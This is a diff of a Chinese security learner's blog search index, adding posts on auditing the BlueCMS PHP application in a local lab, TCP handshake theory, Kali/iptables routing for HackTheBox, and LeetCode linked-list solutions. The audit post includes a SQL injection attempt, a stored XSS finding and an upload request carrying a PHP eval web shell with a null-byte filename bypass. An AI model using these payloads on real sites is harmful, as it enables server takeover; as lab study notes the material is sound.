@@ -422,6 +422,53 @@
       </tags>
   </entry>
   <entry>
+    <title>代码审计</title>
+    <url>/2024/03/12/daimashenji/</url>
+    <content><![CDATA[<h1 id="0x01原因"><a href="#0x01原因" class="headerlink" title="0x01原因"></a>0x01原因</h1><p>还是得从代码角度入手，学学看代码吧</p>
+<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-bluecms"><a href="#1-bluecms" class="headerlink" title="1.bluecms"></a>1.bluecms</h2><p><strong>环境：phpstudy+bluecms</strong></p>
+<p><img src="/../../../Typora/img111/image-20240312163747689.png"></p>
+<h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p><img src="/../../../Typora/img111/image-20240312163952031.png" alt="注册表单部分"></p>
+<p>这里的显然的缺陷就是：</p>
+<p>1.用户名可枚举</p>
+<p>2.任意用户注册</p>
+<p>可能的点：</p>
+<p>1.<strong>二次注入</strong>，即在已有admin用户的情况下，注册admin’；去修改admin’的密码，并以admin的身份登录；<strong>但是这里它处理了，加了个转义符</strong></p>
+<p>2.<strong>sql注入</strong>可以尝试一下，填充后，去会员中心，看看回显</p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>这三段，分别去user、admin表查重用户名，再插入到user表中去</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; WHERE user_name=&#x27;<span class="variable">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$db</span>-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="variable">$user_name</span>&#x27;&quot;</span>))&#123;</span><br><span class="line">		showmsg(<span class="string">&#x27;该用户名已存在&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#x27;&#x27;, &#x27;<span class="variable">$user_name</span>&#x27;, md5(&#x27;<span class="variable">$pwd</span>&#x27;), &#x27;<span class="variable">$email</span>&#x27;, &#x27;<span class="variable">$timestamp</span>&#x27;, &#x27;<span class="variable">$timestamp</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>它这里用的可是拼接，尝试在email中如下操作</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">123@123.com<span class="string">&#x27;,&#x27;</span>12313<span class="string">&#x27;,&#x27;</span>1231<span class="string">&#x27;)&quot;;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>没有</p>
+<h3 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h3><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p><img src="/../../../Typora/img111/image-20240312192713966.png" alt="个人信息表单"></p>
+<p>考虑csrf，先点击确认修改，bp拦截，生成一个csrf poc的文件</p>
+<p>再该浏览器上访问该文件</p>
+<p><img src="/../../../Typora/img111/image-20240312192848059.png" alt="无需多言"></p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>实际上也有xss存在，在if校验中呢，唯独没有对email做长度的校验，在email处写一个基本的&lt;script&gt;，每次访问都可以触发，是一个存储性xss</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; SET birthday = &#x27;<span class="subst">$birthday</span>&#x27;, sex = &#x27;<span class="subst">$sex</span>&#x27;, face_pic = &#x27;<span class="subst">$face_pic</span>&#x27;, email = &#x27;<span class="subst">$email</span>&#x27;, msn = &#x27;<span class="subst">$msn</span>&#x27;, qq = &#x27;<span class="subst">$qq</span>&#x27;,&quot;</span> .</span><br><span class="line">			<span class="string">&quot; mobile_phone = &#x27;<span class="subst">$mobile_phone</span>&#x27;, office_phone = &#x27;<span class="subst">$office_phone</span>&#x27;, home_phone = &#x27;<span class="subst">$home_phone</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27; WHERE user_id = &quot;</span>.<span class="title function_ invoke__">intval</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">	<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>有后缀检测、MIME检测，用户头像一栏其实是给的路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;face_pic2&quot;</span>; filename=<span class="string">&quot;get.php%00.jpg&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传完成后，名字被强制成*.jpg格式；这里先略过</p>
+<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>不存在万能用户、万能密码这种</p>
+<p>普通用户错误密码登录是模糊消息提示，可行</p>
+<p>但是admin登录，不管密码对错，暴露了admin账户存在的事实</p>
+<h3 id="新闻发布"><a href="#新闻发布" class="headerlink" title="新闻发布"></a>新闻发布</h3><p>虽然新闻分类不可选，bp拦截可以添加为1，发布成功</p>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>链接变成了这个</p>
+<p><code>/bluecms-master/news.php?id=1</code></p>
+<p>安装及审计参考 <a href="http://t.csdnimg.cn/8RDMV">http://t.csdnimg.cn/8RDMV</a></p>
+<p>目录索引开启 <a href="https://zhuanlan.zhihu.com/p/435493999">https://zhuanlan.zhihu.com/p/435493999</a></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>协议再探</title>
     <url>/2024/03/11/xieyi/</url>
     <content><![CDATA[<h1 id="0x01-原因"><a href="#0x01-原因" class="headerlink" title="0x01 原因"></a>0x01 原因</h1><p>回顾协议时我又忘了，拿tcp来讲，tcp可靠，可靠在哪里，我依稀的记忆是，有一些协商的字段比如，seq、ack、滑动窗口;比如udp为什么无序等等；哎，这次再记录下来吧，遗忘是常态，熟能生巧</p>
@@ -473,6 +520,28 @@
 <p>但是tcp的话，不开tcp端口，<strong>数据</strong>都发不出去的</p>
 <p>（双方是都是可以发消息的，我只是截图了单向的）</p>
 <p><a href="https://whowin.gitee.io/post/blog/network/0005-send-udp-via-linux-cli/">https://whowin.gitee.io/post/blog/network/0005-send-udp-via-linux-cli/</a></p>
+<h1 id="经典问题"><a href="#经典问题" class="headerlink" title="经典问题"></a>经典问题</h1><h2 id="1-好，两次握手、四次握手为什么不行？"><a href="#1-好，两次握手、四次握手为什么不行？" class="headerlink" title="1.好，两次握手、四次握手为什么不行？"></a>1.好，两次握手、四次握手为什么不行？</h2><p>这里要深究的话，其实是要看看为什么是三次握手？即三次握手的目的是什么？</p>
+<p>从上图中可以明显看到：</p>
+<p>1.<strong>Seq序列号保持初始同步</strong></p>
+<p>2.<strong>双方既能接也能发</strong></p>
+<p>3.<strong>避免重复历史连接</strong></p>
+<p>好，两次握手的弊端就出现了：</p>
+<p>1.我能接，你能接吗？那，老师，我能发，你能发吗？</p>
+<p>2.Seq初始序列号同步问题</p>
+<p>四次握手呢？</p>
+<p>既然三次握手就能搞定的事情，第四次握手，肯定牵扯到发送和接收，这是一个等待过程，白白消耗资源</p>
+<h2 id="2-我三次挥手请战！"><a href="#2-我三次挥手请战！" class="headerlink" title="2.我三次挥手请战！"></a>2.我三次挥手请战！</h2><p>看一下四次挥手在干什么</p>
+<p>A-&gt;B：FIN，我不发东西啦</p>
+<p>B-&gt;A：ACK，好的</p>
+<p>B-&gt;A：FIN，我不发东西啦</p>
+<p>A-&gt;：好的</p>
+<p>这里和前面的握手中的SYN总结一下</p>
+<p>SYN是有双向性质的，而FIN只是单方面结束关系，可以说是单向性；</p>
+<p>FIN，只是说不再发数据了，但不代表它不能处理数据，即没有要求对方也不发数据；</p>
+<p>像第三次挥手存在的一种可能就是这样，你不发是吧？那我发！</p>
+<p>这里其实也解释了，为什么二三不能像握手时合并一样；</p>
+<p>握手就手拉手；挥手，各回各的手</p>
+<p><a href="https://cloud.tencent.com/developer/article/2169717">https://cloud.tencent.com/developer/article/2169717</a></p>
 <h1 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h1><p>kali进行ping命令，wireshark抓到了16个</p>
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240311182507457.png" alt="icmp，没端口，说明不走传输层"></p>
 <p>可以理解为它在IP层和传输层之间，硬要说，那也是在网络层</p>
@@ -491,10 +560,34 @@
     <title>路由转发实操</title>
     <url>/2024/02/16/lyzfsc/</url>
     <content><![CDATA[<h1 id="0x01-实操原因"><a href="#0x01-实操原因" class="headerlink" title="0x01 实操原因"></a>0x01 实操原因</h1><p>玩htb的时候，kali实在不能再多进程啦，开个bp都卡死，之前我不是想着由物理机去开burpsuite，解放kali嘛，但是失败了，当时burp是抓到了虚拟机里访问目标web的包，但是它作为一个代理，源ip(burp)与目的ip(htb)不在同网段，遗憾放弃；但现在不一样了，我是真的花时间去想这个东西，还真让我找到了</p>
-<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><p>三个机子，主机为A，虚拟机kali为B，hackthebox为C</p>
+<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><table>
+<thead>
+<tr>
+<th align="center">系统</th>
+<th align="center">ip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">windows</td>
+<td align="center">192.168.1.142</td>
+</tr>
+<tr>
+<td align="center">kali</td>
+<td align="center">(NAT模式)192.168.241.3</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">(openvpn)10.10.16.18</td>
+</tr>
+<tr>
+<td align="center">htb</td>
+<td align="center">10.10.11.6</td>
+</tr>
+</tbody></table>
+<p>三个机子，主机为A，虚拟机kali为B(一定是NAT模式)，hackthebox为C</p>
 <p>我可以直接给物理机下一个openvpn，但我懒</p>
 <p>已知B通过openvpn能访问C；而我A和B属于另一网段，可互相访问；现在B容易卡死，因为主机太垃圾，虚拟机空间不够，所以我想尝试A通过B访问C，这种思路分析一下，那就是个代理技术，B作为代理服务器，感觉有搞头嘞</p>
-<p>但是貌似有更直接的方法，即<strong>路由转发</strong></p>
+<p>但是貌似有更直接的方法，即<strong>路由转发</strong>，补充一点，这里还是涉及到必要的NAT转换</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">window下：</span><br><span class="line">route add 10.0.0.0 mask 255.0.0.0 192.168.241.3 <span class="comment">#流向C的流量，发往kali</span></span><br><span class="line"><span class="comment">#其实是下面这种</span></span><br><span class="line"><span class="comment">#第一条规则告诉主机A，当它试图访问 10.10.11.249 时，数据包应该通过路由到 10.10.16.9(B使用openvpn时分配的ip)。</span></span><br><span class="line">route add 10.10.16.9 mask 255.255.255.255 192.168.241.3(B的ip)</span><br><span class="line"><span class="comment">#第二条规则告诉主机A，当它试图访问 10.10.16.9 时，数据包应该通过路由到 192.168.241.3。</span></span><br><span class="line">route add 10.10.11.249 mask 255.255.255.255 10.10.16.9</span><br><span class="line"></span><br><span class="line">kali下：</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">iptables -t nat -A POSTROUTING -o &lt;OpenVPN接口&gt; -j MASQUERADE <span class="comment">#接口比如tun0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面这几个缺一不可</span></span><br><span class="line"><span class="comment">#将从物理机A到虚拟机B (Kali) 的流量的源IP地址修改为虚拟机B (Kali) 的IP地址，并且确保相关的转发规则</span></span><br><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -L -n -v #查看配置的</span></span><br></pre></td></tr></table></figure>
 
 
@@ -537,7 +630,70 @@
 <p>可行，这种方式解决了虚拟机内存不够的问题，进程多了容易卡死，这个应该就可以用我物理机的burp去抓包了</p>
 <p>只需要在虚拟机里设置一下http，ip为虚拟机<strong>网关ip</strong>，而物理机的bp(点击选择特定地址时，会有选项的)监听即可</p>
 <p>总结一下，windows机去添加两条路由，告诉数据包应该怎么走；kali做ip转发，以及源ip转换</p>
+<p>burp抓包的话，监听地址为vmet8的网关，虚拟机去firefox设置下同名代理，一致即可</p>
+<p>另附bp白名单设置：</p>
+<p>1.Target-&gt;Scope</p>
+<p>2.proxy勾选对应的正则(is in target scope)才会生效</p>
 <p>参考来源：<strong>chatgpt 3.5</strong> (啧，折腾好久)</p>
+<h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>后面我又遇到同样的需求，重复操作时，不能达到这种目的</p>
+<p>那我觉得有必要去深究一下iptables了</p>
+<h2 id="环境与目的"><a href="#环境与目的" class="headerlink" title="环境与目的"></a>环境与目的</h2><table>
+<thead>
+<tr>
+<th align="center">系统</th>
+<th align="center">ip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">windows</td>
+<td align="center">192.168.1.142</td>
+</tr>
+<tr>
+<td align="center">kali</td>
+<td align="center">(桥接)192.168.1.117</td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">(openvpn)10.10.16.18</td>
+</tr>
+<tr>
+<td align="center">htb</td>
+<td align="center">10.10.11.6</td>
+</tr>
+</tbody></table>
+<p>通信情况：win与kali同网段互通，kali通过openvpn与htb互通</p>
+<p>目的：win能ping通htb</p>
+<p>思路分析：</p>
+<p>目前主机与kali的eth0在同一网段；如果想要ping通kali的tun0网段，只需要在主机路由到tun0即可；关键是ping通htb；</p>
+<p>那就是说通过改源地址和目的地址的方式。</p>
+<p>但这里已经看出来了，kali和主机是桥接模式，不是NAT模式；貌似只能看单纯的流量转发</p>
+<p>而且桥接模式下，kali必须做个代理，不然bp抓不到的，还是用NAT模式吧，一般是监听出口网卡如vmet8</p>
+<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>NAT表</p>
+<table>
+<thead>
+<tr>
+<th align="center">链</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">PREROUTING</td>
+<td align="center">传入时，修改数据包的目的ip地址</td>
+</tr>
+<tr>
+<td align="center">POSTROUTING</td>
+<td align="center">传出时，修改数据包的源ip地址</td>
+</tr>
+<tr>
+<td align="center">OUTPUT</td>
+<td align="center">定义对本地产生的数据包的目的NAT规则</td>
+</tr>
+</tbody></table>
+<p>保存规则</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iptables-save</span><br><span class="line"><span class="comment">#或，保存为文件</span></span><br><span class="line">sudo iptables-save &gt; /etc/iptables/rules.v4</span><br><span class="line">iptables-restore &lt; /etc/iptables/rules.v4</span><br></pre></td></tr></table></figure>
+
+<p>参考：</p>
+<p>一口linux <a href="http://t.csdnimg.cn/rnmaB">http://t.csdnimg.cn/rnmaB</a></p>
 ]]></content>
       <categories>
         <category>路由转发</category>
@@ -5110,7 +5266,7 @@
 <p>f12扫一眼它的源代码，还有js</p>
 <p>看它的网页功能，主要关注有搜索框和登录入口</p>
 <p>登录可以创建账户，先创建一个</p>
-<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#49;&#50;&#x33;&#x34;&#53;&#54;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#49;&#50;&#x33;&#x34;&#53;&#54;&#64;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a>被用过</p>
+<p>admin111&#x2F;test&#x2F;test123用户被用过，<a href="mailto:&#x31;&#50;&#51;&#52;&#x35;&#x36;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;">&#x31;&#50;&#51;&#52;&#x35;&#x36;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#x6d;</a>被用过</p>
 <p>test123qwe，进入，有填写基本信息，有上传图片功能</p>
 <p>有一个报错</p>
 <p><img src="/../../../Typora/img111/image-20231117111539091.png"></p>
@@ -10395,6 +10551,56 @@
       </tags>
   </entry>
   <entry>
+    <title>链表</title>
+    <url>/2023/07/02/%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个结点模板</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Node &#123;</span><br><span class="line">	T data;</span><br><span class="line">	Node *next;</span><br><span class="line">	Node() : next(nullptr) &#123;&#125;</span><br><span class="line">	Node(const T &amp;d) : data(d), next(nullptr) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//删除 p 结点后面的元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Remove(Node&lt;T&gt; *p) &#123;</span><br><span class="line">	if (p == nullptr || p-&gt;next == nullptr) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	auto tmp = p-&gt;next-&gt;next;</span><br><span class="line">	delete p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在 p 结点后面插入元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Insert(Node&lt;T&gt; *p, const T &amp;data) &#123;</span><br><span class="line">	auto tmp = new Node&lt;T&gt;(data);</span><br><span class="line">	tmp-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历链表</span><br><span class="line">template&lt;typename T, typename V&gt;</span><br><span class="line">void Walk(Node&lt;T&gt; *p, const V &amp;vistor) &#123;</span><br><span class="line">	while(p != nullptr) &#123;</span><br><span class="line">		vistor(p);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	auto p = new Node&lt;int&gt;(1);</span><br><span class="line">	Insert(p, 2);</span><br><span class="line">	int sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	Remove(p);</span><br><span class="line">	sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：自在飞花</span><br><span class="line">链接：https://leetcode.cn/problems/linked-list-cycle/solutions/175734/yi-wen-gao-ding-chang-jian-de-lian-biao-wen-ti-h-2/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="1-环形链表"><a href="#1-环形链表" class="headerlink" title="1.环形链表"></a>1.环形链表</h1><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
+<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
+<p><em>如果链表中存在环</em> ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [3,2,0,-4], pos = 1</span><br><span class="line">输出：true</span><br><span class="line">解释：链表中有一个环，其尾部连接到第二个节点。</span><br></pre></td></tr></table></figure>
+
+<h2 id="法1（哈希表）"><a href="#法1（哈希表）" class="headerlink" title="法1（哈希表）"></a>法1（哈希表）</h2><p>哈希表加遍历：每次遍历时，通过哈希表查看该指针是否访问过</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        set&lt;ListNode*&gt; st;</span><br><span class="line">        ListNode* p1=head;</span><br><span class="line">        <span class="keyword">while</span>(p1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st.<span class="built_in">count</span>(p1)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                st.<span class="built_in">insert</span>(p1);</span><br><span class="line">            &#125;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>O(n)</p>
+<p>O(n)</p>
+</blockquote>
+<h2 id="法2（快慢指针）"><a href="#法2（快慢指针）" class="headerlink" title="法2（快慢指针）"></a>法2（快慢指针）</h2><p>这个代码不对</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    bool hasCycle(ListNode *head) &#123;</span><br><span class="line">        if(head==nullptr) return false; //没有元素</span><br><span class="line">        else if(head-&gt;next==nullptr) return false; //有1个元素</span><br><span class="line">        else if(head-&gt;next-&gt;next=head) return true;//有两个元素</span><br><span class="line"></span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next-&gt;next;</span><br><span class="line">        while(p1&amp;&amp;p2)</span><br><span class="line">        &#123;</span><br><span class="line">            if(p1==p2-&gt;next) return true;</span><br><span class="line">            p1=p1-&gt;next;</span><br><span class="line">            p2=p2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[1,2]</p>
+<p>-1</p>
+<p>输出：true</p>
+<p>预期输出：false</p>
+</blockquote>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">nullptr</span>||head-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        ListNode* p1=head,*p2=head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(p1!=p2)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">if</span>(p2==<span class="literal">nullptr</span> || p2-&gt;next==<span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           p1=p1-&gt;next;</span><br><span class="line">           p2=p2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>当链表中不存在环时，快指针将先于慢指针到达链表尾部，链表中每个节点至多被访问两次。</p>
+<p>当链表中存在环时，每一轮移动后，快慢指针的距离将减小一。而初始距离为环的长度，因此至多移动 N 轮。</p>
+<blockquote>
+<p>O(n)</p>
+<p>O(1)</p>
+</blockquote>
+<h1 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2.两数相加"></a>2.两数相加</h1><p>给你两个 <strong>非空</strong> 的链表，表示两个非负的整数。它们每位数字都是按照 <strong>逆序</strong> 的方式存储的，并且每个节点只能存储 <strong>一位</strong> 数字。</p>
+<p>请你将两个数相加，并以相同形式返回一个表示和的链表。</p>
+<p>你可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure>
+
+<h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2>]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>链表</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>力扣</title>
     <url>/2023/07/02/%E5%8A%9B%E6%89%A3/</url>
     <content><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>vscode默认不支持c++11解决办法</p>
@@ -12538,56 +12744,6 @@
       <tags>
         <tag>c++</tag>
         <tag>力扣</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>链表</title>
-    <url>/2023/07/02/%E9%93%BE%E8%A1%A8/</url>
-    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义一个结点模板</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">struct Node &#123;</span><br><span class="line">	T data;</span><br><span class="line">	Node *next;</span><br><span class="line">	Node() : next(nullptr) &#123;&#125;</span><br><span class="line">	Node(const T &amp;d) : data(d), next(nullptr) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//删除 p 结点后面的元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Remove(Node&lt;T&gt; *p) &#123;</span><br><span class="line">	if (p == nullptr || p-&gt;next == nullptr) &#123;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	auto tmp = p-&gt;next-&gt;next;</span><br><span class="line">	delete p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在 p 结点后面插入元素</span><br><span class="line">template&lt;typename T&gt;</span><br><span class="line">void Insert(Node&lt;T&gt; *p, const T &amp;data) &#123;</span><br><span class="line">	auto tmp = new Node&lt;T&gt;(data);</span><br><span class="line">	tmp-&gt;next = p-&gt;next;</span><br><span class="line">	p-&gt;next = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//遍历链表</span><br><span class="line">template&lt;typename T, typename V&gt;</span><br><span class="line">void Walk(Node&lt;T&gt; *p, const V &amp;vistor) &#123;</span><br><span class="line">	while(p != nullptr) &#123;</span><br><span class="line">		vistor(p);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">	auto p = new Node&lt;int&gt;(1);</span><br><span class="line">	Insert(p, 2);</span><br><span class="line">	int sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	Remove(p);</span><br><span class="line">	sum = 0;</span><br><span class="line">	Walk(p, [&amp;sum](const Node&lt;int&gt; *p) -&gt; void &#123; sum += p-&gt;data; &#125;);</span><br><span class="line">	cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">作者：自在飞花</span><br><span class="line">链接：https://leetcode.cn/problems/linked-list-cycle/solutions/175734/yi-wen-gao-ding-chang-jian-de-lian-biao-wen-ti-h-2/</span><br><span class="line">来源：力扣（LeetCode）</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure>
-
-
-
